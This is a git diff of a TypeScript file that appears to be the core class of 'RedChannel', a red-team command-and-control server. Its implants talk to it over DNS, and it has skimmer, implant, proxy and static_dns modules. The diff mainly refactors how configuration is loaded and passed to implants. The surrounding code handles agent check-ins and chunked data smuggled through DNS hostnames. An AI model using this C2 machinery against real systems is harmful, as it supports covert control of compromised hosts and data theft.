@@ -1,18 +1,19 @@
 import * as crypto from "crypto";
 import * as path from "path";
 import ECKey from "ec-key";
+import * as fs from "fs";
+import _merge from "lodash.merge";
 
-import { chunkString, Config, Constants, emsg, padZero } from "../utils/utils";
+import { chunkString, Config, Constants, emsg, padZero } from "../utils";
 import Crypto, { CipherModel, KeyExportType } from "./crypto";
 import Logger from "./logger";
-import SkimmerModule, { SkimmerModuleConfig as SkimmerModuleConfig } from "../modules/skimmer";
-import StaticDnsModule, { StaticDnsModuleConfig } from "../modules/static_dns";
-import ImplantModule, { ImplantModuleConfig as ImplantModuleConfig } from "../modules/implant";
-import AgentModule, { AgentModuleConfig } from "../modules/agent";
-import ProxyModule, { ProxyModuleConfig as ProxyModuleConfig } from "../modules/proxy";
-import C2Module, { C2ModuleConfig } from "../modules/c2";
+import SkimmerModule from "../modules/skimmer";
+import StaticDnsModule from "../modules/static_dns";
+import ImplantModule from "../modules/implant";
+import ProxyModule from "../modules/proxy";
 
-import { implant } from "../pb/implant";
+import { implant } from "../pb/protos";
+import { DefaultConfig, RedChannelConfig } from "./config";
 
 /*
 req: {
@@ -55,7 +56,7 @@ export type C2MessageRequest = {
 export type C2MessageResponse = {
     question: C2ResponseQuestion[];
     answer: C2Answer[];
-    end: Function;
+    end: () => void;
 };
 
 export type AgentMessageSegments = {
@@ -68,13 +69,12 @@ export type AgentMessageSegments = {
     chunk: string;
 };
 
-// to clarify the Map()s
 export type DataId = string;
 export type DataChunk = string;
 export type SendQEntry = string[];
 export type AgentId = string;
 export type AgentIdRandId = string;
-
+export type RecvQMap = Map<DataId, DataChunk[]>;
 export type AgentModel = {
     id: string;
     secret: Buffer;
@@ -85,7 +85,7 @@ export type AgentModel = {
     allowKeyx?: boolean;
     sendq: SendQEntry[];
     // each agent has a map of dataId => chunks[]
-    recvq: Map<DataId, DataChunk[]>;
+    recvq: RecvQMap;
 };
 
 export enum AgentChannel {
@@ -94,24 +94,11 @@ export enum AgentChannel {
     PROXY = "proxy",
 }
 
-export type Modules = {
-    c2: C2Module;
-    agent: AgentModule;
-    skimmer: SkimmerModule;
-    static_dns: StaticDnsModule;
+export type RedChannelModules = {
     proxy: ProxyModule;
     implant: ImplantModule;
-};
-// the config values for each module are made optional
-// as we don't need to define all of these for the config
-// to _merge in BaseModule
-export type ModulesConfig = {
-    c2: Partial<C2ModuleConfig>;
-    agent: Partial<AgentModuleConfig>;
-    skimmer: Partial<SkimmerModuleConfig>;
-    static_dns: Partial<StaticDnsModuleConfig>;
-    proxy: Partial<ProxyModuleConfig>;
-    implant: Partial<ImplantModuleConfig>;
+    static_dns: StaticDnsModule;
+    skimmer: SkimmerModule;
 };
 
 export default class RedChannel {
@@ -120,13 +107,11 @@ export default class RedChannel {
     agents: Map<AgentId, AgentModel>;
     flood: Map<AgentIdRandId, NodeJS.Timeout>;
 
-    // module instances
-    modules: Modules;
-
     hashedPassword: string;
     plaintextPassword: string;
 
     configFile: string;
+    config: RedChannelConfig;
 
     // the absolute path to the app directory
     appRoot: string = path.resolve("./");
@@ -135,43 +120,52 @@ export default class RedChannel {
 
     crypto: Crypto;
 
-    constructor(c2Password: string, cliConfig: ModulesConfig, configFile: string) {
+    modules: RedChannelModules;
+
+    constructor(c2Password: string, configFile: string, initialConfig?: RedChannelConfig) {
         this.log = new Logger();
 
         this.agents = new Map<AgentId, AgentModel>();
 
         this.configFile = configFile ?? Config.DEFAULT_CONFIG_FILE;
 
-        this.modules = {
-            c2: new C2Module(this, cliConfig.c2),
-            proxy: new ProxyModule(
-                this,
-                cliConfig.proxy,
-                (result) => {
-                    this.log.debug(result.message);
-                },
-                (error) => {
-                    this.log.error(error.message);
-                }
-            ),
-            implant: new ImplantModule(this, cliConfig.implant),
-            static_dns: new StaticDnsModule(this, cliConfig.static_dns),
-            skimmer: new SkimmerModule(this, cliConfig.skimmer),
-            agent: new AgentModule(this, cliConfig.agent),
-        };
-
-        if (!this.modules.c2.config.domain) {
-            throw new Error("Please specify the c2 domain via cli or config file, see '--help'");
-        }
+        this.config = this.resetConfig(initialConfig ?? DefaultConfig);
 
         this.plaintextPassword = c2Password;
         this.hashedPassword = crypto.createHash("md5").update(c2Password).digest("hex");
+
+        this.modules = {
+            proxy: new ProxyModule(this.config, this.c2MessageHandler.bind(this), this.log),
+            implant: new ImplantModule(this.config, this.plaintextPassword, this.log),
+            static_dns: new StaticDnsModule(this.config, this.log),
+            skimmer: new SkimmerModule(this.config, this.log),
+        };
+
+        if (!this.config.c2.domain) {
+            throw new Error("Please specify the c2 domain via cli or config file, see '--help'");
+        }
 
         this.appRoot = __dirname;
 
         this.crypto = new Crypto();
 
         this.flood = new Map<AgentId, NodeJS.Timeout>();
+    }
+
+    resetConfig(initialConfig: RedChannelConfig) {
+        let config = initialConfig;
+
+        if (this.configFile) {
+            let configInFile: RedChannelConfig;
+            try {
+                configInFile = JSON.parse(fs.readFileSync(this.configFile).toString()) as RedChannelConfig;
+            } catch (ex) {
+                throw new Error(`error parsing config file: ${emsg(ex)}`);
+            }
+            config = _merge(config, configInFile);
+        }
+
+        return config;
     }
 
     initAgent(agentId: string, channel: AgentChannel, ip?: string) {
@@ -257,11 +251,11 @@ export default class RedChannel {
 
     sendConfigChanges(agentId: string) {
         const configProto = implant.AgentConfig.create({});
-        if (this.modules.agent.config.interval !== undefined) configProto.c2IntervalMs = { value: this.modules.agent.config.interval };
-        if (this.modules.agent.config.throttle_sendq !== undefined) configProto.throttleSendq = { value: this.modules.agent.config.throttle_sendq };
-        if (this.modules.agent.config.proxy_enabled !== undefined) configProto.useWebChannel = { value: this.modules.agent.config.proxy_enabled };
-        if (this.modules.agent.config.proxy_key !== undefined) configProto.webKey = { value: this.modules.agent.config.proxy_key };
-        if (this.modules.agent.config.proxy_url !== undefined) configProto.webUrl = { value: this.modules.agent.config.proxy_url };
+        if (this.config.implant.interval !== undefined) configProto.c2IntervalMs = { value: this.config.implant.interval };
+        if (this.config.implant.throttle_sendq !== undefined) configProto.throttleSendq = { value: this.config.implant.throttle_sendq };
+        if (this.config.implant.proxy_enabled !== undefined) configProto.useWebChannel = { value: this.config.implant.proxy_enabled };
+        if (this.config.implant.proxy_key !== undefined) configProto.webKey = { value: this.config.implant.proxy_key };
+        if (this.config.implant.proxy_url !== undefined) configProto.webUrl = { value: this.config.implant.proxy_url };
 
         const configProtoBuffer = Buffer.from(implant.AgentConfig.encode(configProto).finish());
         // no need to send data, just the config proto
@@ -360,7 +354,7 @@ export default class RedChannel {
                 );
             }
 
-            if (this.modules.proxy.config.enabled && agent.channel === AgentChannel.PROXY) {
+            if (this.config.proxy.enabled && agent.channel === AgentChannel.PROXY) {
                 await this.modules.proxy.sendToProxy(agent.id, ips);
             } else {
                 agent.sendq.push(ips);
@@ -418,7 +412,7 @@ export default class RedChannel {
     }
 
     parseAgentMessageSegments(hostname: string): AgentMessageSegments {
-        const segmentsArray = hostname.slice(0, hostname.length - this.modules.c2.config.domain.length).split(".");
+        const segmentsArray = hostname.slice(0, hostname.length - this.config.c2.domain.length).split(".");
         if (segmentsArray.length < Config.EXPECTED_DATA_SEGMENTS) {
             throw new Error(`invalid message, not enough data segments (${segmentsArray.length}, expected ${Config.EXPECTED_DATA_SEGMENTS}): ${hostname}`);
         }
@@ -479,7 +473,7 @@ export default class RedChannel {
         const hostname = question.name;
         const channel = question.type === "PROXY" ? AgentChannel.PROXY : AgentChannel.DNS;
 
-        const staticDnsHostnameIp = this.modules.static_dns.config.get(hostname);
+        const staticDnsHostnameIp = this.config.static_dns.get(hostname);
         if (staticDnsHostnameIp) {
             this.log.info(`static_dns: responding to request for host: '${hostname}' with ip '${staticDnsHostnameIp}'`);
             res.answer.push({
@@ -491,7 +485,7 @@ export default class RedChannel {
             return res.end();
         }
 
-        if (!hostname.endsWith(this.modules.c2.config.domain)) {
+        if (!hostname.endsWith(this.config.c2.domain)) {
             this.log.debug(`unknown c2 domain, ignoring query for: ${hostname}`);
             return res.end();
         }
@@ -527,7 +521,7 @@ export default class RedChannel {
             return res.end();
         }
 
-        const agent = this.agents.get(agentId)!;
+        const agent = this.agents.get(agentId) as AgentModel;
 
         agent.lastseen = Date.now() / 1000;
         agent.ip = req.connection.remoteAddress;
@@ -547,8 +541,7 @@ export default class RedChannel {
             agent.recvq.set(dataId, new Array(segments.totalChunks));
         }
 
-        // we use ! to tell typescript we are smarter than it
-        const recvqDataId = agent.recvq.get(dataId)!;
+        const recvqDataId = agent.recvq.get(dataId) as DataChunk[];
         recvqDataId[segments.chunkNumber] = segments.chunk;
 
         // count all data array entries, excluding undefined
@@ -622,6 +615,7 @@ export default class RedChannel {
         }
         return answers;
     }
+
     checkInAgent(agent: AgentModel, hostname: string, data: string): C2Answer[] | void {
         const agentId = agent.id;
 
